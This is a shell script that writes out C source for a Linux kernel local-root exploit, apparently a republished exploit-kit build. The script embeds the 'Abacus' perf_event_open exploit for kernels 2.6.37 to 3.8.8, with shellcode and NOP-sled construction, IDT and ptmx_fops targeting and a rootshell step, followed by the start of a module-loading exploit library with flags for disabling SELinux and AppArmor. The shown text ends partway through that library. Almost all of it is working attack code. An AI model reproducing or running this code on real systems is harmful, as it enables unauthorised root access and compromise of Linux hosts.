#!/bin/sh
# original exploit by sd@fucksheep.org, written in 2010
# heavily modified by spender to do things and stuff
# edited by Pashkela for RDOT.ORG 02.06.2013
cat > exp_abacus.c <<_EOF
/*
 * original exploit by sd@fucksheep.org, written in 2010
 * heavily modified by spender to do things and stuff
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <assert.h>

#define BIT64  (sizeof(unsigned long) != sizeof(unsigned int))

#define STRAIGHT_UP_EXECUTION_AT_NULL 0x31337
 /* for overflows */
#define EXIT_KERNEL_TO_NULL 0x31336

#define EXECUTE_AT_NONZERO_OFFSET 0xfffff000 // OR the offset with this

/* defines for post_exploit */
#define RUN_ROOTSHELL 0x5150
#define CHMOD_SHELL 0x5151
#define FUNNY_PIC_AND_ROOTSHELL 0xdeadc01d

typedef unsigned long (*_get_kernel_sym)(char *name);
typedef unsigned long __attribute__((regparm(3))) (*_kallsyms_lookup_name)(char *name);

struct exploit_state {
	_get_kernel_sym get_kernel_sym;
	_kallsyms_lookup_name kallsyms_lookup_name;
	void *own_the_kernel;
	void *exit_kernel;
	char *exit_stack;
	int run_from_main;
	int got_ring0;
	int got_root;
};

#define EFL_RESERVED1 (1 << 1)
#define EFL_PARITY (1 << 2)
#define EFL_ZEROFLAG (1 << 6)
#define EFL_INTERRUPTENABLE (1 << 9)
#define EFL_IOPL3 ((1 << 12) | (1 << 13))

#define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE)
/* for insta-iopl 3, for whatever reason!
   #define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE | EFL_IOPL3)
*/

#define DISABLED_LSM 		0x1
#define DISABLED_IMA 		0x2
#define DISABLED_APPARMOR 	0x4
#define DISABLED_SELINUX	0x8


struct exploit_state *exp_state;
int is_old_kernel = 0;

char *desc = "Abacus: Linux 2.6.37 -> 3.8.8 PERF_EVENTS local root";

int requires_null_page = 0;

#define JMPLABELBASE64 0x1780000000
#define JMPLABELBASE32 0x1a00000
#define JMPLABELBASE (BIT64 ? JMPLABELBASE64 : JMPLABELBASE32)
#define JMPLABELNOMODBASE64 0xd80000000
#define JMPLABELNOMODBASE32 0x40000000
#define JMPLABELNOMODBASE (BIT64 ? JMPLABELNOMODBASE64 : JMPLABELNOMODBASE32)
#define BASE64  0x380000000
#define BASE32  0x80000000
#define BASE (BIT64 ? BASE64 : BASE32)
#define SIZE64  0x010000000
#define SIZE32  0x02000000
#define SIZE (BIT64 ? SIZE64 : SIZE32)
#define KSIZE  (BIT64 ? 0x2000000 : 0x2000)
#define SYSCALL_NO (BIT64 ? 298 : 336)
#define MAGICVAL (BIT64 ? 0x44444443 : 0x44444445)

static int wrap_val;
static int structsize;
static int has_jmplabel;
static int is_unaligned;
static int target_offset;
static int computed_index;
static unsigned long target_addr;
static unsigned long array_base;
unsigned long kbase;

struct {
	uint16_t limit;
	uint64_t addr;
} __attribute__((packed)) idt;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int ring0_cleanup(void)
{
	if (BIT64) {
		*(unsigned int *)(target_addr + target_offset) = 0xffffffff;
		/* clean up the probe effects for redhat tears */
		(*(unsigned int *)(array_base - structsize))--;
		(*(unsigned int *)(array_base - (2 * structsize)))--;
	}
	/* on 32bit we let the kernel clean up for us */
	return 0;
}

int main_pid;
int signals_dont_work[2];
int total_children;

static int send_event(uint32_t off) {
	uint64_t buf[10] = { 0x4800000001,off,0,0,0,0x320 };
	int fd;

	if ((int)off >= 0) {
		printf(" [-] Target is invalid, index is positive.\n");
		exit(1);
	}
	if (getpid() == main_pid)
		printf(" [+] Submitting index of %d to perf_event_open\n", (int)off);
	fd = syscall(SYSCALL_NO, buf, 0, -1, -1, 0);

	if (fd < 0) {
		printf(" [-] System rejected creation of perf event.\n");
		exit(1);
	}
	if (BIT64)
		close(fd);
	return fd;
}

//static unsigned long security_ops;
static unsigned long perf_swevent_enabled;
static unsigned long ptmx_fops;

int trigger(void)
{
	/* !SMEP version */
	printf(" [!] Array base is %p\n", (void *)array_base);
	printf(" [!] Detected structure size of %d bytes\n", structsize);
	printf(" [!] Targeting %p\n", (void *)(array_base + (structsize * computed_index)));

#ifdef __x86_64__
	send_event(computed_index);
	if (is_unaligned) {
		asm volatile (
		"pushfq\n"
		"orq \$0x40000, (%rsp)\n"
		"popfq\n"
		"test %rax, 0x1(%rsp)\n"
		);
	} else {
		asm("int \$0x4");
	}
#else
	{
		unsigned long kbase_counter = 0;
		int ret;
		int fd;
		int pipes[2];
		int i;
		char garbage;

		/* child notification/reaping code from zx2c4 */

		pipe(pipes);
		pipe(signals_dont_work);

		main_pid = getpid();

		total_children = 0;

		while (kbase_counter < kbase) {
			if (!fork()) {
				int x;
				for (x = 0; x < 512; x++)
					send_event(computed_index);
				write(pipes[1], &garbage, 1);
				read(signals_dont_work[0], &garbage, 1);
				_exit(0);
			}
			kbase_counter += 512;
			total_children++;

		}
		for (i = 0; i < total_children; i++)
			read(pipes[0], &garbage, 1);

		fd = open("/dev/ptmx", O_RDWR);
		if (fd < 0) {
			printf(" [-] Unable to open /dev/ptmx\n");
			exit(1);
		}
		{
			struct iovec iov;
			/* this choice is arbitrary */
			iov.iov_base = &iov;
			iov.iov_len = sizeof(iov);
			/* this one is not ;) */
			readv(fd, &iov, 1);
		}
	}
#endif

	/* SMEP/SMAP version, shift security_ops */
	//security_ops = (unsigned long)exp_state->get_kernel_sym("security_ops");
	//for (i = 0; i < sizeof(unsigned long); i++)
	//	send_event(-wrap_val + ((security_ops&0xffffffff)-0x80000000)/4, 1);
	// add fancy trigger here

	return 0;
}

int post(void)
{
	write(signals_dont_work[1], &total_children, total_children);
	return RUN_ROOTSHELL;
}

static int find_mod_in_mapping(unsigned int *mem, unsigned long len, int *idx)
{
	unsigned long i, x;

	for (i = 0; i < len/4; i++) {
		if (mem[i] == MAGICVAL) {
			for (x = 1; x < 7; x++) {
				if (mem[i+x] == MAGICVAL) {
					*idx = i;
					return 4 * x;
				}
			}
			break;
		}
	}
	return 0;
}

int prepare(unsigned char *buf)
{
	unsigned char *mem;
	unsigned char *p;
	int fd;
	unsigned int *map1, *map2, *map3;
	int i, x;
	unsigned long idx;
	char c;
	int fd1, fd2;

	assert((map1 = mmap((void*)BASE, SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0)) == (void*)BASE);
	memset(map1, 0x44, SIZE);
	assert((map2 = mmap((void*)JMPLABELBASE, SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0)) == (void*)JMPLABELBASE);
	memset(map2, 0x44, SIZE);
	assert((map3 = mmap((void*)JMPLABELNOMODBASE, SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0)) == (void*)JMPLABELNOMODBASE);
	memset(map3, 0x44, SIZE);
	fd1 = send_event(BIT64 ? -1 : -(1024 * 1024 * 1024)/4);
	fd2 = send_event(BIT64 ? -2 : -(1024 * 1024 * 1024)/4-1);

	structsize = find_mod_in_mapping(map1, SIZE, &i);
	if (!structsize) {
		structsize = find_mod_in_mapping(map2, SIZE, &i);
		if (!structsize) {
			structsize = find_mod_in_mapping(map3, SIZE, &i);
			if (!structsize) {
				printf(" [-] Unsupported configuration.\n");
				if (!BIT64) {
					close(fd1);
					close(fd2);
				}
				exit(1);
			} else
				has_jmplabel = 1;
		} else
			has_jmplabel = 1;
	}

	/* permit the dec back */
	if (!BIT64) {
		close(fd1);
		close(fd2);
	}
	wrap_val = 4 * i + 2 * structsize;

	if (BIT64) {
		/* use masked kernel range here */
		asm ("sidt %0" : "=m" (idt));
		kbase = idt.addr & 0xff000000;
		target_addr = idt.addr;
		array_base = 0xffffffff80000000UL | wrap_val;

		/* do we need to target AC instead? */
		if (has_jmplabel) {
			if  ((array_base - target_addr) % structsize) {
				is_unaligned = 1;
				target_offset = 0x118;
			} else
				target_offset = 0x48;
		} else
			target_offset = 0x48;

		computed_index = -((array_base-target_addr-target_offset)/structsize);
	} else {
		int brute;

		/* use just above mmap_min_addr here */
		kbase = 0;
		while (1) {
			mem = (unsigned char *)mmap((void *)kbase, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
			if (mem != MAP_FAILED) {
				munmap((void *)kbase, 0x1000);
				break;
			} else
				kbase += 0x1000;
		}
		array_base = (unsigned long)exp_state->get_kernel_sym("perf_swevent_enabled");
		target_addr = (unsigned long)exp_state->get_kernel_sym("ptmx_fops");
		if (!target_addr || !array_base) {
			printf(" [-] Symbols required for i386 exploitation (in this exploit).\n");
			exit(1);
		}
		target_offset = 4 * sizeof(unsigned int);
		computed_index = 0;
		for (brute = -1; brute < 0; brute--) {
			if (array_base + (brute * structsize) == (target_addr + target_offset)) {
				computed_index = brute;
				break;
			}
		}
		if (!computed_index) {
			printf(" [-] Unable to reach ptmx_fops target under this configuration.\n");
			exit(1);
		}
	}

	/* elito hungarian technique */
	fd = open("./suckit_selinux_nopz", O_CREAT | O_WRONLY, 0644);
	if (fd < 0) {
		printf("unable to create nop sled file\n");
		exit(1);
	}

	mem = (unsigned char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap nop sled\n");
		goto error;
	}
	memset(mem, 0x90, 0x1000);
	write(fd, mem, 0x1000);
	close(fd);
	munmap(mem, 0x1000);

	fd = open("./suckit_selinux", O_CREAT | O_WRONLY, 0644);
	if (fd < 0) {
		printf("unable to create shellcode file\n");
		exit(1);
	}

	mem = (unsigned char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mem == MAP_FAILED) {
		printf("unable to mmap nop sled\n");
		goto error;
	}
	memset(mem, 0x90, 0x1000);
	p = (unsigned char *)(mem + 0x1000 - 3 - (2 * (2 + 4 + sizeof(unsigned long))));
	if (BIT64) {
		// swapgs
		p[0] = 0x0f;
		p[1] = 0x01;
		p[2] = 0xf8;
	} 
	p += 3;
	// call own_the_kernel
	p[0] = 0xff;
	p[1] = 0x15;
	*(unsigned int *)&p[2] = BIT64 ? 6 : kbase + KSIZE - (2 * sizeof(unsigned long));
	// call exit_kernel
	p[6] = 0xff;
	p[7] = 0x25;
	*(unsigned int *)&p[8] = BIT64 ? sizeof(unsigned long) : kbase + KSIZE - sizeof(unsigned long);
	*(unsigned long *)&p[12] = (unsigned long)exp_state->own_the_kernel;
	*(unsigned long *)&p[12 + sizeof(unsigned long)] = (unsigned long)exp_state->exit_kernel;

	write(fd, mem, 0x1000);
	close(fd);
	munmap(mem, 0x1000);

	fd = open("./suckit_selinux_nopz", O_RDONLY);
	if (fd < 0) {
		printf("unable to open nop sled file for reading\n");
		goto error;
	}
	// map in nops and page them in
	for (idx = 0; idx < (KSIZE/0x1000)-1; idx++) {
		mem = (unsigned char *)mmap((void *)(kbase + idx * 0x1000), 0x1000, PROT_READ | PROT_EXEC, MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (mem != (unsigned char *)(kbase + idx * 0x1000)) {
			printf("unable to mmap\n");
			goto error;
		}
		if (!idx)
			assert(!mlock(mem, 0x1000));
		c = *(volatile char *)mem;
	}

	fd = open("./suckit_selinux", O_RDONLY);
	if (fd < 0) {
		printf("unable to open shellcode file for reading\n");
		goto error;
	}
	mem = (unsigned char *)mmap((void *)(kbase + KSIZE - 0x1000), 0x1000, PROT_READ | PROT_EXEC, MAP_FIXED | MAP_PRIVATE, fd, 0);
	if (mem != (unsigned char *)(kbase + KSIZE - 0x1000)) {
		printf("unable to mmap\n");
		goto error;
	}
	assert(!mlock(mem, 0x1000));
	c = *(volatile char *)mem;

	unlink("./suckit_selinux");
	unlink("./suckit_selinux_nopz");

	return 0;
error:
	unlink("./suckit_selinux");
	unlink("./suckit_selinux_nopz");
	exit(1);
}
_EOF
cat > exploit.c <<_EOF
/* exploit lib */

#include <asm/unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/personality.h>
#include <time.h>
#include <unistd.h>
#include <fnmatch.h>
#include <dirent.h>
#include <dlfcn.h>
#include <grp.h>
#ifdef HAVE_SELINUX
#include <selinux/selinux.h>
#include <selinux/context.h>
#endif

#ifndef PATH_MAX
#define PATH_MAX 4095
#endif

/* defines for prepare_the_exploit */
 /* for null fptr derefs */
#define STRAIGHT_UP_EXECUTION_AT_NULL 0x31337
 /* for overflows */
#define EXIT_KERNEL_TO_NULL 0x31336

#define EXECUTE_AT_NONZERO_OFFSET 0xfffff000 // OR the offset with this

/* defines for post_exploit */
#define RUN_ROOTSHELL 0x5150
#define CHMOD_SHELL 0x5151
#define FUNNY_PIC_AND_ROOTSHELL 0xdeadc01d

typedef unsigned long (*_get_kernel_sym)(char *name);
typedef unsigned long __attribute__((regparm(3))) (*_kallsyms_lookup_name)(char *name);

struct exploit_state {
	_get_kernel_sym get_kernel_sym;
	_kallsyms_lookup_name kallsyms_lookup_name;
	void *own_the_kernel;
	void *exit_kernel;
	char *exit_stack;
	int run_from_main;
	int got_ring0;
	int got_root;
};

#define EFL_RESERVED1 (1 << 1)
#define EFL_PARITY (1 << 2)
#define EFL_ZEROFLAG (1 << 6)
#define EFL_INTERRUPTENABLE (1 << 9)
#define EFL_IOPL3 ((1 << 12) | (1 << 13))

#define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE)
/* for insta-iopl 3, for whatever reason!
   #define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE | EFL_IOPL3)
*/

#define DISABLED_LSM 		0x1
#define DISABLED_IMA 		0x2
#define DISABLED_APPARMOR 	0x4
#define DISABLED_SELINUX	0x8



typedef int (*_prepare_for_exploit)(unsigned char *buf);
typedef int (*_trigger_the_bug)(void);
typedef int (*_post_exploit)(void);
typedef int (*_ring0_cleanup)(void);
typedef int (*_get_exploit_state_ptr)(struct exploit_state *exp_state);

#define MAX_EXPLOITS 32

struct exploit_module {
	char desc[512];
	_get_exploit_state_ptr get_exploit_state_ptr;
	_prepare_for_exploit prep;
	_trigger_the_bug trigger;
	_post_exploit post;
	_ring0_cleanup ring0_cleanup;
	int requires_null_page;
	int requires_symbols_to_trigger;
} modules[MAX_EXPLOITS];
int num_exploits = 0;

char *thoughts[] = {
	"The limits of my language are the limits of my mind.  All I know is what I have words for. --Wittgenstein",
	"A clock struck noon; Lucien rose.  The metamorphosis was complete: " \
	"a graceful, uncertain adolescent had entered this cafe one hour " \
	"earlier; now a man left, a leader among Frenchmen.  Lucien took a few " \
	"steps in the glorious light of a French morning.  At the corner of " \
   	"Rue des Ecoles and the Boulevard Saint-Michel he went towards a "\
	"stationery shop and looked at himself in the mirror: he would have " \
	"liked to find on his own face the impenetrable look he admired on " \
	"Lemordant's.  But the mirror only reflected a pretty, headstrong " \
	"little face that was not yet terrible.  \"I'll grow a moustache,\" " \
	"he decided. --Sartre",
	"The whole problem with the world is that fools and fanatics are always " \
	"so full of themselves, but wiser people so full of doubts. --Russell",
	"Mathematics, rightly viewed, posses not only truth, but supreme " \
	"beauty cold and austere, like that of sculpture. --Russell",
	"The person who writes for fools is always sure of a large audience. --Schopenhauer",
	"With people of limited ability modesty is merely honesty.  But " \
	"with those who possess real talent it is hypocrisy. --Schopenhauer",
	"Seek not the favor of the multitude; it is seldom got by honest and lawful means.  " \
	"But seek the testimony of few; and number not voices, but weigh them. --Kant",
	"At this moment, when each of us must fit an arrow to his bow and " \
	"enter the lists anew, to reconquer, within history and in spite of it, " \
	"that which he owns already, the thin yield of his fields, the brief " \
	"love of the earth, at this moment when at last a man is born, it is " \
	"time to forsake our age and its adolescent furies.  The bow bends; " \
	"the wood complains.  At the moment of supreme tension, there will " \
	"leap into flight an unswerving arrow, a shaft that is inflexible and " \
	"free. --Camus",
	"We forfeit three-quarters of ourselves in order to be like other people. --Schopenhauer",
	"Style is what gives value and currency to thoughts. --Schopenhauer",
	"Every truth passes through three stages before it is recognized.  In " \
	"the first it is ridiculed, in the second it is opposed, in the third " \
	"it is regarded as self evident. --Schopenhauer",
	"Before the Law stands a doorkeeper.  To this doorkeeper there comes a " \
	"man from the country who begs for admittance to the Law.  But the doorkeeper " \
	"says that he cannot admit the man at the moment.  The man, on reflection, asks " \
	"if he will be allowed, then, to enter later.  'It is possible,' answers " \
	"the doorkeeper, 'but not at this moment.'  Since the door leading into the Law " \
	"stands open as usual and the doorkeeper steps to one side, the man bends " \
	"down to peer through the entrance.  When the doorkeeper sees that, he laughs " \
	"and says: 'If you are so strongly tempted, try to get in without my " \
	"permission.  But note that I am powerful.  And I am only the lowest " \
	"doorkeeper.  From hall to hall, keepers stand at every door, one more powerful " \
	"than the other.  And the sight of the third man is already more than even I " \
	"can stand.'  These are difficulties which the man from the country has not " \
	"expected to meet, the Law, he thinks, should be accessible to every man " \
	"and at all times, but when he looks more closely at the doorkeeper in his " \
	"furred robe, with his huge, pointed nose and long, thin, Tartar beard, " \
	"he decides that he had better wait until he gets permission to enter.  " \
	"The doorkeeper gives him a stool and lets him sit down at the side of " \
	"the door.  There he sits waiting for days and years.  He makes many " \
	"attempts to be allowed in and wearies the doorkeeper with his importunity.  " \
	"The doorkeeper often engages him in brief conversation, asking him about " \
	"his home and about other matters, but the questions are put quite impersonally, " \
	"as great men put questions, and always conclude with the statement that the man " \
	"cannot be allowed to enter yet.  The man, who has equipped himself with many " \
	"things for his journey, parts with all he has, however valuable, in the hope " \
	"of bribing the doorkeeper.  The doorkeeper accepts it all, saying, however, " \
	"as he takes each gift: 'I take this only to keep you from feeling that you " \
	"have left something undone.'  During all these long years the man watches " \
	"the doorkeeper almost incessantly.  He forgets about the other doorkeepers, " \
	"and this one seems to him the only barrier between himself and the Law.  " \
	"In the first years he curses his evil fate aloud; later, as he grows old, " \
	"he only mutters to himself.  He grows childish, and since in his prolonged " \
	"study of the doorkeeper he has learned to know even the fleas in his fur " \
	"collar, he begs the very fleas to help him and to persuade the doorkeeper " \
	"to change his mind.  Finally his eyes grow dim and he does not know whether " \
	"the world is really darkening around him or whether his eyes are only " \
	"deceiving him.  But in the darkness he can now perceive a radiance that streams " \
	"inextinguishably from the door of the Law.  Now his life is drawing to a close.  " \
	"Before he dies, all that he has experienced during the whole time of his sojourn " \
	"condenses in his mind into one question, which he has never yet put to the " \
	"doorkeeper.  He beckons the doorkeeper, since he can no longer raise his stiffening " \
	"body.  The doorkeeper has to bend far down to hear him, for the difference in " \
	"size between them has increased very much to the man's disadvantage.  'What " \
	"do you want to know now?' asks the doorkeeper, 'you are insatiable.'  " \
	"'Everyone strives to attain the Law,' answers the man, 'how does it come " \
	"about, then, that in all these years no one has come seeking admittance " \
	"but me?'  The doorkeeper perceives that the man is nearing his end and his " \
	"hearing is failing, so he bellows in his ear: 'No one but you could gain " \
	"admittance through this door, since this door was intended for you.  " \
	"I am now going to shut it.'  --Kafka",
	"These are the conclusions of individualism in revolt.  The individual cannot " \
	"accept history as it is.  He must destroy reality, not collaborate with it, " \
	"in order to reaffirm his own existence. --Camus",
	"The desire for possession is only another form of the desire to endure; it is " \
	"this that comprises the impotent delirium of love.  No human being, even " \
	"the most passionately loved and passionately loving, is ever in our possession. --Camus",
	"In art, rebellion is consummated and perpetuated in the act of real creation, " \
	"not in criticism or commentary. --Camus",
	"There is, therefore, only one categorical imperative.  It is: Act only according " \
	"to that maxim by which you can at the same time will that it should become a " \
	"universal law. --Kant",
	"You have your way.  I have my way.  As for the right way, the correct way, and " \
	"the only way, it does not exist. --Nietzsche",
	"The person lives most beautifully who does not reflect upon existence. --Nietzsche",
	"To be free is nothing, to become free is everything. --Hegel",
	"Man acts as though he were the shaper and master of language, while in fact language " \
	"remains the master of man. --Heidegger",
	"Truth always rests with the minority, and the minority is always stronger than the " \
	"majority, because the minority is generally formed by those who really have an " \
	"opinion, while the strength of a majority is illusory, formed by the gangs who " \
	"have no opinion -- and who, therefore, in the next instant (when it is evident " \
	"that the minority is the stronger) assume its opinion... while truth again reverts " \
	"to a new minority. --Kierkegaard",
	"Reading furnishes the mind only with materials of knowledge; it is thinking that " \
	"makes what we read ours. --Locke",
	"I would warn you that I do not attribute to nature either beauty or deformity, " \
	"order or confusion.  Only in relation to our imagination can things be called " \
	"beautiful or ugly, well-ordered or confused. --Spinoza",
	"The work of an intellectual is not to mould the political will of others; it is, " \
	"through the analyses that he does in his own field, to re-examine evidence and " \
	"assumptions, to shake up habitual ways of working and thinking, to dissipate " \
	"conventional familiarities, to re-evaluate rules and institutions and to " \
	"participate in the formation of a political will (where he has his role as " \
	"citizen to play). --Foucault",
	"The more I read, the more I meditate; and the more I acquire, the more I am " \
	"enabled to affirm that I know nothing. --Voltaire",
	"Completely joyless autumn days followed.  The novel was written, there was " \
	"nothing more to be done, and our life consisted of sitting on the rug next to " \
	"the stove, staring at the fire.  Besides, we started spending more time apart " \
	"than we had before.  She began going out for walks.  And something strange " \
	"happened, as had often been the case in my life... I suddenly made a friend.  " \
	"Yes, yes, imagine, I don't make friends easily as a rule, due to a devilish " \
	"peculiarity of mine: it's a strain for me to be with people, and I'm distrustful " \
	"and suspicious.  But -- imagine, despite all that, some unlikely, unexpected " \
	"fellow, who looks like the devil knows what, will unfailingly make his way into " \
	"my heart, and he'll be the one I like more than anyone else. --Bulgakov",
	"But what are smart people smart for, if not to untangle tangled things? --Bulgakov",
	"You pronounced your words as if you refuse to acknowledge the existence of either " \
	"shadows or evil.  But would you kindly ponder this question: What would your good " \
	"do if evil didn't exist, and what would the earth look like if all the shadows " \
	"disappeared?  After all, shadows are cast by things and people.  Here is a shadow " \
	"of my sword.  But shadows also come from trees and from living beings.  Do you want to " \
	"strip the earth of all trees and living things just because of your fantasy of enjoying " \
	"naked light?  You're stupid. --Bulgakov",
	"\"Excuse me, but this is, after all, absurd,\" said Korovyov, refusing to give in.  " \
	"\"It isn't an ID that defines a writer, but what he has written!  How can you know what " \
	"ideas are fermenting in my brain?\"  --Bulgakov",
	"Beauty is a fearful and terrible thing!  Fearful because it's undefinable, and it " \
	"cannot be defined, because here God gave us only riddles.  Here the shores converge, " \
	"here all contradictions live together.  I'm a very uneducated man, brother, but I've " \
	"thought about it a lot.  So terribly many mysteries!  Too many riddles oppress man on " \
	"earth.  Solve them if you can without getting your feet wet.  Beauty!  Besides, I can't " \
	"bear it that some man, even with a lofty heart and the highest mind, should start from " \
	"the ideal of the Madonna and end with the ideal of Sodom.  It's even more fearful when " \
	"one who already has the ideal of Sodom in his soul does not deny the ideal of the " \
	"Madonna either, and his heart burns with it, verily, verily burns, as in his young, " \
	"blameless years.  No, man is broad, even too broad, I would narrow him down.  Devil " \
	"knows even what to make of him, that's the thing!  What's shame for the mind is beauty " \
	"all over for the heart.  Can there be beauty in Sodom?  Believe me, for the vast " \
	"majority of the people, that's just where beauty lies -- did you know that secret?  " \
	"The terrible thing is that beauty is not only fearful but also mysterious.  Here the " \
	"devil is struggling with God, and the battlefield is the human heart.  --Dostoevsky",
	"\"I heard exactly the same thing, a long time ago to be sure, from a doctor,\" the " \
	"elder remarked.  \"He was then an old man, and unquestionably intelligent.  " \
	"He spoke just as frankly as you, humorously, but with a sorrowful humor.  'I love " \
	"mankind,' he said, 'but I am amazed at myself: the more I love mankind in general, " \
	"the less I love people in particular, that is, individually, as separate persons.  " \
	"In my dreams,' he said, 'I often went so far as to think passionately of serving " \
	"mankind, and, it may be, would really have gone to the cross for people if it were " \
	"somehow suddenly necessary, and yet I am incapable of living in the same room with " \
	"anyone even for two days, this I know from experience.  As soon as someone is there, " \
	"close to me, his personality oppresses my self-esteem and restricts my freedom.  In " \
	"twenty-four hours I can begin to hate even the best of men: one because he takes too " \
	"long eating his dinner, another because he has a cold and keeps blowing his nose.  " \
	"I become the enemy of people the moment they touch me,' he said.  'On the other hand, " \
	"it has always happened that the more I hate people individually, the more ardent " \
	"becomes my love for humanity as a whole.'\" --Dostoevsky",
	"A man who lies to himself is often the first to take offense.  It sometimes feels " \
	"very good to take offense, doesn't it?  And surely he knows that no one has offended " \
	"him, and that he himself has invented the offense and told lies just for the beauty " \
	"of it, that he has exaggerated for the sake of effect, that he has picked on a word " \
	"and made a mountain out of a pea -- he knows all of that, and still he is the first " \
	"to take offense, he likes feeling offended, it gives him great pleasure, and thus " \
	"he reaches the point of real hostility. --Dostoevsky",
	"If your opponent is weak or does not wish to appear as if he has no idea what you " \
	"are talking about, you can easily impose upon him some argument that sounds very deep " \
	"or learned, or that sounds indisputable. --Schopenhauer",
	"Self-knowledge -- the bitterest knowledge of all and also the kind we cultivate " \
	"least: what is the use of catching ourselves out, morning to night, in the act " \
	"of illusion, pitilessly tracing each act back to its root, and losing case after " \
	"case before our own tribunal? --Cioran",
	"A man who fears ridicule will never go far, for good or ill: he remains on this side " \
	"of his talents, and even if he has genius, he is doomed to mediocrity. --Cioran",
	"In order to understand the world, one has to turn away from it on occasion. --Camus",
	"Man stands face to face with the irrational.  He feels within him his longing for " \
	"happiness and for reason.  The absurd is born of this confrontation between the " \
	"human need and the unreasonable silence of the world. --Camus"
};

void RANDOM_THOUGHT(void)
{
	int i;
	char *thought;
	char *p, *p2;
	char c;
	int size_of_thought;
	srand(time(NULL));
	thought = strdup(thoughts[rand() % (sizeof(thoughts)/sizeof(thoughts[0]))]);
	if (thought == NULL)
		return;
	size_of_thought = strlen(thought);
	fprintf(stdout, " ------------------------------------------------------------------------------\n");
	for (i = 0; i < size_of_thought;) {
		if (i + 78 >= size_of_thought) {
			fprintf(stdout, " %.78s\n", &thought[i]);
			break;
		}
		p = &thought[i + 77];
		c = *p;
		*p = '\0';
		p2 = strrchr(&thought[i], ' ');
		*p = c;
		if (p2) {
			*p2 = '\n';
			c = p2[1];
			p2[1] = '\0';
			fprintf(stdout, " %.78s", &thought[i]);
			p2[1] = c;
			i += (int)((unsigned long)p2 + 1 - (unsigned long)&thought[i]);
		} else {
			fprintf(stdout, " %.78s\n", &thought[i]);
			break;
		}
	}
	fprintf(stdout, " ------------------------------------------------------------------------------\n");
	free(thought);
}

int check_entry(const struct dirent *dir)
{
	if (!fnmatch("exp_*.so", dir->d_name, 0))
		return 1;
	return 0;
}

void add_exploit_modules(void)
{
	struct dirent **namelist;
	void *mod;
	void *desc, *prepare, *trigger, *post, *get_exp_state_ptr, *requires_null_page, *ring0_cleanup, *requires_symbols_to_trigger;
	char tmpname[PATH_MAX];
	int n;
	int i;
	n = scandir(".", &namelist, &check_entry, alphasort);
	if (n < 0) {
		fprintf(stdout, "No exploit modules found, exiting...\n");
		exit(1);
	}
	for (i = 0; i < n; i++) {
		snprintf(tmpname, sizeof(tmpname)-1, "./%s", namelist[i]->d_name);
		tmpname[sizeof(tmpname)-1] = '\0';
		mod = dlopen(tmpname, RTLD_NOW);
		if (mod == NULL) {
unable_to_load:
			fprintf(stdout, "Unable to load %s\n", namelist[i]->d_name);
			free(namelist[i]);
			continue;
		}
		desc = dlsym(mod, "desc");
		prepare = dlsym(mod, "prepare");
		ring0_cleanup = dlsym(mod, "ring0_cleanup");
		trigger = dlsym(mod, "trigger");
		post = dlsym(mod, "post");
		requires_null_page = dlsym(mod, "requires_null_page");
		requires_symbols_to_trigger = dlsym(mod, "requires_symbols_to_trigger");
		get_exp_state_ptr = dlsym(mod, "get_exploit_state_ptr");

		if (desc == NULL || prepare == NULL || trigger == NULL || post == NULL || get_exp_state_ptr == NULL || requires_null_page == NULL)
			goto unable_to_load;

#ifdef NON_NULL_ONLY
		if (*(int *)requires_null_page) {
			free(namelist[i]);
			continue;
		}
#else
		if (!*(int *)requires_null_page) {
			free(namelist[i]);
			continue;
		}
#endif

		if (num_exploits >= MAX_EXPLOITS) {
			fprintf(stdout, "Max exploits reached.\n");
			return;
		}
		strncpy(modules[num_exploits].desc, *(char **)desc, sizeof(modules[num_exploits].desc) - 1);
		modules[num_exploits].desc[sizeof(modules[num_exploits].desc)-1] = '\0';
		modules[num_exploits].prep = (_prepare_for_exploit)prepare;
		modules[num_exploits].trigger = (_trigger_the_bug)trigger;
		modules[num_exploits].post = (_post_exploit)post;
		modules[num_exploits].ring0_cleanup = (_ring0_cleanup)ring0_cleanup;
		modules[num_exploits].get_exploit_state_ptr = (_get_exploit_state_ptr)get_exp_state_ptr;
		modules[num_exploits].requires_null_page = *(int *)requires_null_page;
		modules[num_exploits].requires_symbols_to_trigger = requires_symbols_to_trigger ? *(int *)requires_symbols_to_trigger : 0;
		free(namelist[i]);
		num_exploits++;
	}

	return;
}

struct exploit_state exp_state;
int eightk_stack = 0;
int twofourstyle = 0;
int raised_caps = 0;
unsigned long current_addr = 0;
int cred_support = 0;
int cred_offset = 0;
int fs_offset = 0;
int aio_read_offset = 0;
int has_vserver = 0;
int vserver_offset = 0;
unsigned long init_cred_addr = 0;
unsigned long default_exec_domain = 0;

#define TASK_RUNNING 0

#ifdef __x86_64__
#define KERNEL_BASE 0xffffffff81000000UL
#define KSTACK_MIN  0xffff800000000000UL
